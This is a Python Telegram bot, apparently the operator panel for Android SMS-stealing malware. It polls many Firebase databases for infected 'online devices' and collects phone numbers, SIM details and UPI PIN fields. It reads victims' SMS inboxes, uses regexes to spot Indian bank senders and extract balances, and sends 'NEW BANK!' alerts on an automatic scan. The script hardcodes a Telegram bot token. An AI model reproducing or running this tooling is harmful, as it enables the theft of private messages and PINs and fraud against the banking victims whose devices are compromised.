#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, re, sys, time, signal, logging, asyncio, traceback
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple

import aiohttp, requests
from aiohttp import ClientTimeout, TCPConnector, ClientSession, ClientError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.error import TelegramError, RetryAfter, TimedOut, NetworkError
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8908910798:AAFy6DWXPeCaLAnGkcGz0jCc9hMbeZP7deY")
BOT_NAME = "FIREBASE MANAGER PRO"

BATCH_SIZE = 10
MAX_CONCURRENT_REQUESTS = 50
MAX_PER_HOST = 5
HTTP_TIMEOUT = 8
MAX_RETRIES = 2
RETRY_DELAY = 1.0
PAGE_DELAY = 1.5
MAX_FIREBASES = 500
MAX_DEVICES_PER_FB = 100
MAX_MSG_LENGTH = 3800
AUTO_SCAN_INTERVAL = 60

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("FBManager")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.ext").setLevel(logging.WARNING)

USER_FIREBASES: Dict[int, List[str]] = {}
USER_AUTO_SCAN: Dict[int, bool] = {}
USER_LAST_BANKS: Dict[int, Dict[str, str]] = {}

def get_user_firebases(uid): return USER_FIREBASES.get(uid, [])
def add_user_firebase(uid, url):
    if uid not in USER_FIREBASES: USER_FIREBASES[uid] = []
    if url in USER_FIREBASES[uid]: return False
    USER_FIREBASES[uid].append(url); return True
def add_user_firebases(uid, urls):
    if uid not in USER_FIREBASES: USER_FIREBASES[uid] = []
    added = 0
    for url in urls:
        if url not in USER_FIREBASES[uid]:
            USER_FIREBASES[uid].append(url); added += 1
    return added
def clear_user_firebases(uid): USER_FIREBASES[uid] = []
def is_auto_scan_on(uid): return USER_AUTO_SCAN.get(uid, False)
def set_auto_scan(uid, state): USER_AUTO_SCAN[uid] = state

DEVICE_FIELD_MAP = {
    "name": ["modelName", "model", "deviceName", "device_name", "name", "deviceModel", "model_name", "brand", "handset"],
    "battery": ["battery", "batteryLevel", "battery_level", "bat", "battery_percent", "batteryPercentage", "power"],
    "status": ["status", "is_online", "isOnline", "online", "active", "connected", "state", "isActive"],
    "phone": ["mobNo", "phone", "phoneNumber", "phone_number", "mobile", "mobileNumber", "number", "msisdn"],
    "android": ["androidV", "androidVersion", "android_version", "os_version", "sdkV"],
    "ip": ["ip_address", "ipAddress", "ip", "public_ip", "local_ip"],
    "provider": ["service_provider", "serviceProvider", "provider", "carrier", "network", "networkOperator"],
    "upipin": ["upipin", "upi_pin", "upiPin", "upi", "pin"],
    "lastSeen": ["lastSeen", "last_seen", "lastOnline", "last_online", "lastActive", "last_active", "timestamp", "updatedAt"],
    "sims": ["sims", "sim_info", "simInfo", "sim", "simCards", "sim_details"],
}

MESSAGE_FIELD_MAP = {
    "text": ["message", "body", "text", "content", "msg", "sms_body", "smsBody", "sms"],
    "sender": ["sender", "from", "address", "number", "phone", "originator", "sender_address"],
    "time": ["dateTime", "datetime", "date", "time", "timestamp", "sentAt", "receivedAt"],
    "type": ["type", "msgType", "msg_type", "messageType", "direction"],
}

CLIENTS_PATHS = ["clients", "devices", "device_list", "deviceList", "online_devices", "data/clients", "users", "active_devices"]

MESSAGES_PATHS = [
    "messages/{device_id}", "messages/{device_id}/inbox", "data/messages/{device_id}",
    "sms/{device_id}", "inbox/{device_id}", "clients/{device_id}/messages",
    "clients/{device_id}/sms", "devices/{device_id}/messages", "{device_id}/messages",
]

BANK_PATTERNS = [
    (re.compile(r"HDFCBK|HDFCBANK|HDFC", re.I), "HDFC Bank"),
    (re.compile(r"SBIIN|SBIINB|SBIN|SBI", re.I), "SBI"),
    (re.compile(r"ICICIB|ICICI", re.I), "ICICI Bank"),
    (re.compile(r"AXISBK|AXISBANK|AXIS", re.I), "Axis Bank"),
    (re.compile(r"KOTAKB|KOTAK", re.I), "Kotak Bank"),
    (re.compile(r"PNBSMS|PNB", re.I), "PNB"),
    (re.compile(r"BOIIND|BOI", re.I), "Bank of India"),
    (re.compile(r"CANBNK|CANARA", re.I), "Canara Bank"),
    (re.compile(r"UNIONB|UBISMS", re.I), "Union Bank"),
    (re.compile(r"YESBNK|YESBANK", re.I), "Yes Bank"),
    (re.compile(r"IDBIBK|IDBI", re.I), "IDBI Bank"),
    (re.compile(r"INDUSB|INDUSIND", re.I), "IndusInd Bank"),
    (re.compile(r"FEDERAL|FEDBNK", re.I), "Federal Bank"),
    (re.compile(r"RBLBNK|RBL", re.I), "RBL Bank"),
    (re.compile(r"PAYTM", re.I), "Paytm"),
    (re.compile(r"PHONEPE|PHNPE", re.I), "PhonePe"),
    (re.compile(r"GPAY|GOOGLEPAY", re.I), "Google Pay"),
    (re.compile(r"AMAZONPAY", re.I), "Amazon Pay"),
    (re.compile(r"BAJAJFIN", re.I), "Bajaj Finance"),
    (re.compile(r"CRED", re.I), "CRED"),
    (re.compile(r"AIRTEL", re.I), "Airtel Payments"),
    (re.compile(r"JIOMNY|JIOMONEY", re.I), "Jio Money"),
]

BALANCE_PATTERNS = [
    re.compile(r"(?:Avl|Avail|Aval|Avbl)\.?\s*(?:Bal|Balance)\.?\s*(?:INR|Rs\.?|₹)?\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"(?:Available|Avail)\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([\d,]+\.?\d*)", re.I),
    re.compile(r"Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)\s+(?:Avl|Bal)", re.I),
]

def escape_html(text):
    if text is None: return ""
    try:
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    except: return ""

def safe_str(value, default="—"):
    if value is None: return default
    try:
        s = str(value).strip()
        return s if s else default
    except: return default

def get_field(data, field_type, default=None):
    if not isinstance(data, dict): return default
    for key in DEVICE_FIELD_MAP.get(field_type, []):
        try:
            if key in data and data[key] is not None: return data[key]
        except: continue
    return default

def get_msg_field(data, field_type, default=None):
    if not isinstance(data, dict): return default
    for key in MESSAGE_FIELD_MAP.get(field_type, []):
        try:
            if key in data and data[key] is not None: return data[key]
        except: continue
    return default

def is_online(info):
    try:
        status = get_field(info, "status")
        if status is None: return False
        if isinstance(status, bool): return status
        if isinstance(status, (int, float)): return status == 1
        if isinstance(status, str):
            return status.lower() in ["true", "online", "active", "connected", "1", "yes", "on"]
        return False
    except: return False

def normalize_battery(battery):
    try:
        if battery is None: return "—"
        if isinstance(battery, (int, float)): return f"{int(battery)}%"
        s = str(battery).strip()
        if s.endswith("%"): return s
        if s.isdigit(): return f"{s}%"
        return s
    except: return "—"

def get_sim_phone(sim):
    if not isinstance(sim, dict): return "—"
    for key in ["phoneNumber", "phone_number", "number", "phone", "mobNo", "mobile", "msisdn"]:
        try:
            if key in sim and sim[key]: return str(sim[key])
        except: continue
    return "—"

def validate_url(url):
    if not url or not isinstance(url, str): return False
    url = url.strip()
    if not url.startswith("http"): return False
    lower = url.lower()
    if "firebaseio.com" not in lower and "firebasedatabase.app" not in lower: return False
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        return bool(p.scheme and p.netloc)
    except: return False

def clean_url(line):
    line = line.strip()
    if not line: return None
    lower = line.lower()
    if "firebaseio.com" not in lower and "firebasedatabase.app" not in lower: return None
    m = re.search(r'https?://[^\s<>"\']+', line, re.I)
    if m: line = m.group(0)
    else:
        line = re.sub(r'^[^a-zA-Z0-9]+', '', line)
        line = "https://" + line
    line = line.rstrip("/,;.\"'` ")
    return line if validate_url(line) else None

def detect_bank_name(sender, text):
    try:
        combined = f"{sender} {text}".upper()
        for pattern, name in BANK_PATTERNS:
            if pattern.search(combined): return name
    except: pass
    return "Unknown"

def extract_balance(text):
    try:
        for pattern in BALANCE_PATTERNS:
            m = pattern.search(text)
            if m:
                val = m.group(1).replace(",", "")
                try: return f"₹{float(val):,.2f}"
                except: return f"₹{val}"
    except: pass
    return "—"

def analyze_messages(messages):
    result = {"bank_name": "—", "balance": "—"}
    if not messages or not isinstance(messages, dict): return result
    try:
        items = list(messages.items()); items.reverse()
        for _, msg_data in items[:50]:
            if not isinstance(msg_data, dict): continue
            text = safe_str(get_msg_field(msg_data, "text", ""), "")
            sender = safe_str(get_msg_field(msg_data, "sender", ""), "")
            if not text: continue
            msg_type = safe_str(get_msg_field(msg_data, "type", ""), "").lower()
            if msg_type in ["outgoing", "sent", "outbox"]: continue
            bank = detect_bank_name(sender, text)
            if bank == "Unknown": continue
            balance = extract_balance(text)
            if balance != "—":
                result["bank_name"] = bank
                result["balance"] = balance
                break
            elif result["bank_name"] == "—":
                result["bank_name"] = bank
    except: pass
    return result

async def fetch_json(session, url, timeout=HTTP_TIMEOUT, retries=MAX_RETRIES):
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=ClientTimeout(total=timeout)) as resp:
                if resp.status == 200:
                    try: return await resp.json(content_type=None)
                    except: return None
                elif resp.status in (401, 403, 404): return None
                elif resp.status == 429:
                    await asyncio.sleep(RETRY_DELAY * (attempt + 1)); continue
                else: return None
        except (asyncio.TimeoutError, ClientError):
            if attempt < retries: await asyncio.sleep(RETRY_DELAY); continue
        except Exception:
            if attempt < retries: await asyncio.sleep(RETRY_DELAY); continue
    return None

async def fetch_firebase_devices(session, firebase_url):
    base = firebase_url.rstrip("/")
    for path in CLIENTS_PATHS:
        try:
            url = f"{base}/{path}.json"
            data = await fetch_json(session, url)
            if not data or not isinstance(data, dict): continue
            devices = []
            for dev_id, info in data.items():
                try:
                    if not isinstance(info, dict): continue
                    merged = dict(info)
                    for nk in ["info", "device", "data", "details", "deviceInfo"]:
                        if nk in info and isinstance(info[nk], dict):
                            merged = {**merged, **info[nk]}
                    info = merged
                    if not any(k in info for k in ["modelName", "model", "deviceName", "name", "status", "sims", "battery", "mobNo", "phone", "is_online"]): continue
                    if not is_online(info): continue
                    name = safe_str(get_field(info, "name", "Unknown Device"))
                    sims = get_field(info, "sims", [])
                    if isinstance(sims, dict): sims = list(sims.values())
                    if not isinstance(sims, list): sims = []
                    phone = safe_str(get_field(info, "phone", "—"))
                    if phone == "—" and sims: phone = get_sim_phone(sims[0])
                    devices.append({
                        "id": safe_str(dev_id), "name": name, "phone": phone,
                        "battery": normalize_battery(get_field(info, "battery")),
                    })
                    if len(devices) >= MAX_DEVICES_PER_FB: break
                except: continue
            if devices: return devices, path, None
        except: continue
    return [], None, "No online devices"

async def fetch_device_messages(session, firebase_url, device_id):
    base = firebase_url.rstrip("/")
    for template in MESSAGES_PATHS:
        try:
            path = template.format(device_id=device_id)
            data = await fetch_json(session, f"{base}/{path}.json")
            if data and isinstance(data, dict): return analyze_messages(data)
        except: continue
    return {"bank_name": "—", "balance": "—"}

async def analyze_firebases(urls, progress_callback=None):
    results = []
    total = len(urls)
    processed = 0
    if not urls: return results
    connector = TCPConnector(limit=MAX_CONCURRENT_REQUESTS, limit_per_host=MAX_PER_HOST, ttl_dns_cache=300)
    try:
        async with ClientSession(connector=connector, timeout=ClientTimeout(total=HTTP_TIMEOUT),
                                  headers={"Accept": "application/json", "User-Agent": "FBManager/1.0"}) as session:
            for bs in range(0, total, BATCH_SIZE):
                batch = urls[bs:bs + BATCH_SIZE]
                tasks = [fetch_firebase_devices(session, u) for u in batch]
                try: dr = await asyncio.gather(*tasks, return_exceptions=True)
                except: dr = [Exception("fail")] * len(batch)
                for i, url in enumerate(batch):
                    fb = {"firebase_url": url, "devices": [], "error": None}
                    try:
                        d = dr[i]
                        if isinstance(d, Exception):
                            fb["error"] = f"Error: {str(d)[:80]}"
                            results.append(fb); processed += 1; continue
                        devs, _, err = d
                        if err:
                            fb["error"] = err; results.append(fb); processed += 1; continue
                        mt = [fetch_device_messages(session, url, x["id"]) for x in devs]
                        try: mr = await asyncio.gather(*mt, return_exceptions=True)
                        except: mr = [{"bank_name": "—", "balance": "—"}] * len(devs)
                        for dev, m in zip(devs, mr):
                            try:
                                if isinstance(m, Exception): m = {"bank_name": "—", "balance": "—"}
                                dev["bank_name"] = m.get("bank_name", "—")
                                dev["balance"] = m.get("balance", "—")
                                fb["devices"].append(dev)
                            except: continue
                        results.append(fb); processed += 1
                    except Exception as e:
                        fb["error"] = f"Error: {str(e)[:80]}"
                        results.append(fb); processed += 1
                if progress_callback:
                    try: await progress_callback(processed, total)
                    except: pass
                if bs + BATCH_SIZE < total: await asyncio.sleep(0.5)
    except Exception as e: logger.error(f"Analyze error: {e}")
    return results

def format_results(results):
    if not results: return ["❌ No results"]
    td = sum(len(fb.get("devices", [])) for fb in results)
    tb = sum(1 for fb in results for d in fb.get("devices", []) if d.get("balance", "—") != "—")
    header = (f"✅ <b>ANALYSIS COMPLETE</b>\n\n🌐 Firebases: <b>{len(results)}</b>\n"
              f"📱 Online: <b>{td}</b>\n💰 With Balance: <b>{tb}</b>\n\n<i>📋 Tap to copy</i>\n")
    chunks, current = [], header
    for fb in results:
        try:
            url = fb.get("firebase_url", ""); us = escape_html(url); devs = fb.get("devices", [])
            if fb.get("error"):
                block = f"\n━━━━━━━━━\n🌐 <code>{us}</code>\n❌ {escape_html(fb['error'])}\n"
            else:
                block = f"\n━━━━━━━━━\n🌐 <code>{us}</code>\n📱 <b>{len(devs)}</b>\n━━━━━━━━━\n"
                for i, d in enumerate(devs, 1):
                    db = (f"\n<b>#{i}</b> {escape_html(d.get('name','?'))}\n"
                          f"🆔 <code>{escape_html(d.get('id',''))}</code>\n"
                          f"🌐 <code>{us}</code>\n"
                          f"📞 <code>{escape_html(d.get('phone','—'))}</code>\n"
                          f"🔋 {escape_html(d.get('battery','—'))}  🏦 {escape_html(d.get('bank_name','—'))}  💰 <b>{escape_html(d.get('balance','—'))}</b>\n")
                    if len(current) + len(block) + len(db) > MAX_MSG_LENGTH:
                        chunks.append(current); current = f"📄 Page {len(chunks)+1}\n"
                    block += db
            if len(current) + len(block) > MAX_MSG_LENGTH:
                chunks.append(current); current = f"📄 Page {len(chunks)+1}\n"
            current += block
        except: continue
    if current.strip(): chunks.append(current)
    return chunks or ["❌ No output"]

async def safe_send(chat_id, text, bot, retries=3):
    for _ in range(retries):
        try:
            await bot.send_message(chat_id=chat_id, text=text, parse_mode='HTML', disable_web_page_preview=True)
            return True
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 1)
        except (TimedOut, NetworkError): await asyncio.sleep(2)
        except TelegramError: return False
        except: return False
    return False

def main_menu_kb(uid=0):
    auto = "🟢 ON" if is_auto_scan_on(uid) else "🔴 OFF"
    cnt = len(get_user_firebases(uid))
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Firebase", callback_data="add_single"),
         InlineKeyboardButton("📥 Add Multiple", callback_data="add_multiple")],
        [InlineKeyboardButton("📋 List All", callback_data="list_fb"),
         InlineKeyboardButton("🔄 Recheck", callback_data="recheck")],
        [InlineKeyboardButton("📊 Analyze All", callback_data="analyze"),
         InlineKeyboardButton("🟢 Online Only", callback_data="online_only")],
        [InlineKeyboardButton(f"🏦 Auto Bank: {auto}", callback_data="toggle_auto")],
        [InlineKeyboardButton("🗑 Delete All", callback_data="delete_all"),
         InlineKeyboardButton("❓ Help", callback_data="help_menu")],
        [InlineKeyboardButton(f"📊 Total: {cnt} firebase(s)", callback_data="noop")],
    ])

def back_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="menu")]])
def cancel_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu")]])
def confirm_del_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("✅ Yes", callback_data="confirm_delete"), InlineKeyboardButton("❌ No", callback_data="menu")]])

def menu_text(uid):
    cnt = len(get_user_firebases(uid))
    auto = "🟢 ON" if is_auto_scan_on(uid) else "🔴 OFF"
    return (f"⚡ <b>{BOT_NAME}</b>\n━━━━━━━━━━━━━━━\n\n📊 <b>Dashboard</b>\n"
            f"├ 🌐 Firebases: <b>{cnt}</b>\n├ 🏦 Auto Bank: <b>{auto}</b>\n└ ⚡ Status: <b>Ready</b>\n\n👇 <b>Select:</b>")

async def start(update, context):
    uid = update.effective_user.id
    text = menu_text(uid); kb = main_menu_kb(uid)
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode='HTML')
        except: await update.callback_query.message.reply_text(text, reply_markup=kb, parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=kb, parse_mode='HTML')

async def help_command(update, context):
    text = (f"⚡ <b>{BOT_NAME}</b>\n\n➕ Add Firebase\n📥 Add Multiple\n📋 List All\n"
            f"🔄 Recheck\n📊 Analyze All\n🟢 Online Only\n🏦 Auto Bank\n🗑 Delete All")
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, reply_markup=back_kb(), parse_mode='HTML')
        except: pass
    else:
        await update.message.reply_text(text, reply_markup=back_kb(), parse_mode='HTML')

async def menu_callback(u, c): await u.callback_query.answer(); await start(u, c)
async def noop_callback(u, c): await u.callback_query.answer()

async def add_single_cb(u, c):
    await u.callback_query.answer(); c.user_data["state"] = "add_single"
    await u.callback_query.edit_message_text("➕ <b>Add Firebase</b>\n\nSend URL:\n<code>https://xxx.firebaseio.com</code>", reply_markup=cancel_kb(), parse_mode='HTML')

async def add_multiple_cb(u, c):
    await u.callback_query.answer(); c.user_data["state"] = "add_multiple"
    await u.callback_query.edit_message_text("📥 <b>Add Multiple</b>\n\nSend URLs (one per line)", reply_markup=cancel_kb(), parse_mode='HTML')

async def list_cb(u, c):
    await u.callback_query.answer(); uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("📋 No firebases saved.", reply_markup=back_kb(), parse_mode='HTML'); return
    text = f"📋 <b>Your Firebases ({len(urls)})</b>\n\n"
    for i, x in enumerate(urls, 1): text += f"{i}. <code>{escape_html(x)}</code>\n"
    if len(text) > MAX_MSG_LENGTH: text = text[:MAX_MSG_LENGTH] + "\n...truncated"
    await u.callback_query.edit_message_text(text, reply_markup=back_kb(), parse_mode='HTML', disable_web_page_preview=True)

async def recheck_cb(u, c):
    await u.callback_query.answer(); uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("❌ No firebases.", reply_markup=back_kb(), parse_mode='HTML'); return
    await u.callback_query.edit_message_text(f"🔄 Rechecking {len(urls)}...\n<code>[░░░░░░░░░░] 0/{len(urls)}</code>", parse_mode='HTML')
    await _run(u, c, urls, "recheck")

async def analyze_cb(u, c):
    await u.callback_query.answer(); uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("❌ No firebases.", reply_markup=back_kb(), parse_mode='HTML'); return
    await u.callback_query.edit_message_text(f"📊 Analyzing {len(urls)}...\n<code>[░░░░░░░░░░] 0/{len(urls)}</code>", parse_mode='HTML')
    await _run(u, c, urls, "analyze")

async def online_cb(u, c):
    await u.callback_query.answer(); uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("❌ No firebases.", reply_markup=back_kb(), parse_mode='HTML'); return
    await u.callback_query.edit_message_text(f"🟢 Scanning {len(urls)}...", parse_mode='HTML')
    results = await analyze_firebases(urls)
    text = f"🟢 <b>ONLINE DEVICES</b>\n\n"
    for fb in results:
        if fb.get("error"): continue
        us = escape_html(fb.get("firebase_url", ""))
        text += f"\n🌐 <code>{us}</code>\n"
        for d in fb.get("devices", []):
            text += f"   🆔 <code>{escape_html(d.get('id',''))}</code>\n   📞 <code>{escape_html(d.get('phone','—'))}</code>\n"
        if len(text) > 3800: break
    await safe_send(u.effective_chat.id, text, c.bot)
    await c.bot.send_message(chat_id=u.effective_chat.id, text=menu_text(uid), reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def toggle_auto_cb(u, c):
    uid = u.effective_user.id; cur = is_auto_scan_on(uid); set_auto_scan(uid, not cur)
    await u.callback_query.answer(f"Auto Bank: {'🟢 ON' if not cur else '🔴 OFF'}", show_alert=True)
    await start(u, c)

async def delete_all_cb(u, c):
    await u.callback_query.answer(); uid = u.effective_user.id; cnt = len(get_user_firebases(uid))
    if cnt == 0:
        await u.callback_query.edit_message_text("❌ Nothing to delete.", reply_markup=back_kb(), parse_mode='HTML'); return
    await u.callback_query.edit_message_text(f"🗑 Delete {cnt} firebase(s)?", reply_markup=confirm_del_kb(), parse_mode='HTML')

async def confirm_del_cb(u, c):
    await u.callback_query.answer(); uid = u.effective_user.id; cnt = len(get_user_firebases(uid)); clear_user_firebases(uid)
    await u.callback_query.edit_message_text(f"✅ Deleted {cnt}.", reply_markup=back_kb(), parse_mode='HTML')

async def help_menu_cb(u, c): await help_command(u, c)

async def _run(update, context, urls, mode):
    total = len(urls); lu = {"t": 0, "c": 0}
    async def pcb(p, t):
        now = time.time()
        if p - lu["c"] >= max(5, t // 20) or now - lu["t"] >= 3 or p == t:
            lu["c"] = p; lu["t"] = now
            bar = "█" * int(10 * p / t) + "░" * (10 - int(10 * p / t)) if t else "░░░░░░░░░░"
            try: await update.callback_query.edit_message_text(f"{'🔄' if mode=='recheck' else '📊'} [{bar}] {p}/{t}", parse_mode='HTML')
            except: pass
    results = await analyze_firebases(urls, progress_callback=pcb)
    chunks = format_results(results)
    try: await update.callback_query.edit_message_text(f"✅ Done! Sending {len(chunks)} page(s)...")
    except: pass
    for i, ch in enumerate(chunks):
        await safe_send(update.effective_chat.id, ch, context.bot)
        if i < len(chunks) - 1: await asyncio.sleep(PAGE_DELAY)
    try: await context.bot.send_message(chat_id=update.effective_chat.id, text=menu_text(update.effective_user.id), reply_markup=main_menu_kb(update.effective_user.id), parse_mode='HTML')
    except: pass

async def handle_msg(update, context):
    state = context.user_data.get("state"); text = update.message.text.strip() if update.message.text else ""; uid = update.effective_user.id
    if not state:
        await update.message.reply_text(menu_text(uid), reply_markup=main_menu_kb(uid), parse_mode='HTML'); return
    if state == "add_single":
        url = clean_url(text)
        if not url:
            await update.message.reply_text("❌ Invalid URL", reply_markup=cancel_kb(), parse_mode='HTML'); return
        if add_user_firebase(uid, url):
            cnt = len(get_user_firebases(uid))
            await update.message.reply_text(f"✅ Added!\n🔗 <code>{escape_html(url)}</code>\n📊 Total: <b>{cnt}</b>", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        else:
            await update.message.reply_text("⚠️ Already exists", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        context.user_data["state"] = None
    elif state == "add_multiple":
        urls = [clean_url(l) for l in text.split("\n") if clean_url(l)]
        if not urls:
            await update.message.reply_text("❌ No valid URLs", reply_markup=cancel_kb(), parse_mode='HTML'); return
        added = add_user_firebases(uid, urls); cnt = len(get_user_firebases(uid))
        await update.message.reply_text(f"✅ Added: <b>{added}</b>\n📊 Total: <b>{cnt}</b>", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        context.user_data["state"] = None
    else:
        context.user_data["state"] = None
        await update.message.reply_text(menu_text(uid), reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def auto_scanner(app):
    while True:
        try:
            await asyncio.sleep(AUTO_SCAN_INTERVAL)
            for uid in list(USER_FIREBASES.keys()):
                if not is_auto_scan_on(uid): continue
                urls = get_user_firebases(uid)
                if not urls: continue
                try:
                    results = await analyze_firebases(urls)
                    cur = USER_LAST_BANKS.get(uid, {}); new = {}; alerts = []
                    for fb in results:
                        for d in fb.get("devices", []):
                            k = f"{fb.get('firebase_url','')}|{d.get('id','')}"
                            b = d.get("bank_name", "—"); bal = d.get("balance", "—")
                            if b not in ["—", "Unknown"]:
                                new[k] = f"{b}|{bal}"
                                if (k not in cur or cur[k] != new[k]) and bal != "—":
                                    alerts.append({"url": fb.get("firebase_url",""), "did": d.get("id",""), "b": b, "bal": bal})
                    USER_LAST_BANKS[uid] = new
                    for a in alerts[:5]:
                        try:
                            await app.bot.send_message(chat_id=uid, text=f"🏦 <b>NEW BANK!</b>\n\n🌐 <code>{escape_html(a['url'])}</code>\n🆔 <code>{escape_html(a['did'])}</code>\n🏦 {escape_html(a['b'])}\n💰 {escape_html(a['bal'])}", parse_mode='HTML')
                            await asyncio.sleep(1)
                        except: pass
                except: pass
        except Exception as e:
            logger.error(f"Auto: {e}"); await asyncio.sleep(10)

async def post_init(app):
    try:
        await app.bot.set_my_commands([
            BotCommand("start", "🏠 Main Menu"), BotCommand("add", "➕ Add Firebase"),
            BotCommand("addmulti", "📥 Add Multiple"), BotCommand("list", "📋 List All"),
            BotCommand("recheck", "🔄 Recheck"), BotCommand("analyze", "📊 Analyze"),
            BotCommand("online", "🟢 Online Only"), BotCommand("autobank", "🏦 Auto Bank"),
            BotCommand("deleteall", "🗑 Delete All"), BotCommand("help", "❓ Help"),
        ])
        logger.info("✅ Commands set")
    except Exception as e: logger.warning(f"Commands: {e}")
    asyncio.create_task(auto_scanner(app))
    logger.info("🏦 Auto scanner started")

async def add_cmd(u, c):
    c.user_data["state"] = "add_single"
    await u.message.reply_text("➕ Send URL:\n<code>https://xxx.firebaseio.com</code>", reply_markup=cancel_kb(), parse_mode='HTML')

async def addmulti_cmd(u, c):
    c.user_data["state"] = "add_multiple"
    await u.message.reply_text("📥 Send URLs (one per line)", reply_markup=cancel_kb(), parse_mode='HTML')

async def list_cmd(u, c):
    uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls: await u.message.reply_text("📋 No firebases.", reply_markup=main_menu_kb(uid), parse_mode='HTML'); return
    text = f"📋 <b>Firebases ({len(urls)})</b>\n\n"
    for i, x in enumerate(urls, 1): text += f"{i}. <code>{escape_html(x)}</code>\n"
    await u.message.reply_text(text[:4000], reply_markup=back_kb(), parse_mode='HTML')

async def recheck_cmd(u, c):
    uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls: await u.message.reply_text("❌ No firebases."); return
    msg = await u.message.reply_text(f"🔄 Rechecking {len(urls)}...")
    results = await analyze_firebases(urls)
    chunks = format_results(results)
    for i, ch in enumerate(chunks):
        await safe_send(u.effective_chat.id, ch, c.bot)
        if i < len(chunks) - 1: await asyncio.sleep(PAGE_DELAY)

async def online_cmd(u, c):
    uid = u.effective_user.id; urls = get_user_firebases(uid)
    if not urls: await u.message.reply_text("❌ No firebases."); return
    msg = await u.message.reply_text(f"🟢 Scanning...")
    results = await analyze_firebases(urls)
    text = "🟢 <b>ONLINE</b>\n\n"
    for fb in results:
        if fb.get("error"): continue
        text += f"\n🌐 <code>{escape_html(fb.get('firebase_url',''))}</code>\n"
        for d in fb.get("devices", []):
            text += f"🆔 <code>{escape_html(d.get('id',''))}</code>\n📞 <code>{escape_html(d.get('phone','—'))}</code>\n"
    await safe_send(u.effective_chat.id, text[:4000], c.bot)

async def autobank_cmd(u, c):
    uid = u.effective_user.id; cur = is_auto_scan_on(uid); set_auto_scan(uid, not cur)
    st = "🟢 ON" if not cur else "🔴 OFF"
    await u.message.reply_text(f"🏦 Auto Bank: {st}", reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def deleteall_cmd(u, c):
    uid = u.effective_user.id; cnt = len(get_user_firebases(uid))
    if cnt == 0: await u.message.reply_text("❌ Nothing."); return
    clear_user_firebases(uid)
    await u.message.reply_text(f"✅ Deleted {cnt}.", reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if isinstance(context.error, (TimedOut, NetworkError)): return

def main():
    logger.info("=" * 50)
    logger.info(f"🤖 {BOT_NAME}")
    logger.info("=" * 50)
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
        d = r.json()
        if not d.get("ok"): logger.error(f"❌ {d}"); sys.exit(1)
        logger.info(f"✅ Bot: @{d['result'].get('username')}")
    except Exception as e:
        logger.error(f"❌ {e}"); sys.exit(1)
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=5)
        logger.info("✅ Webhook deleted")
    except: pass
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("add", add_cmd))
    app.add_handler(CommandHandler("addmulti", addmulti_cmd))
    app.add_handler(CommandHandler("list", list_cmd))
    app.add_handler(CommandHandler("recheck", recheck_cmd))
    app.add_handler(CommandHandler("analyze", recheck_cmd))
    app.add_handler(CommandHandler("online", online_cmd))
    app.add_handler(CommandHandler("autobank", autobank_cmd))
    app.add_handler(CommandHandler("deleteall", deleteall_cmd))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(noop_callback, pattern="^noop$"))
    app.add_handler(CallbackQueryHandler(add_single_cb, pattern="^add_single$"))
    app.add_handler(CallbackQueryHandler(add_multiple_cb, pattern="^add_multiple$"))
    app.add_handler(CallbackQueryHandler(list_cb, pattern="^list_fb$"))
    app.add_handler(CallbackQueryHandler(recheck_cb, pattern="^recheck$"))
    app.add_handler(CallbackQueryHandler(analyze_cb, pattern="^analyze$"))
    app.add_handler(CallbackQueryHandler(online_cb, pattern="^online_only$"))
    app.add_handler(CallbackQueryHandler(toggle_auto_cb, pattern="^toggle_auto$"))
    app.add_handler(CallbackQueryHandler(delete_all_cb, pattern="^delete_all$"))
    app.add_handler(CallbackQueryHandler(confirm_del_cb, pattern="^confirm_delete$"))
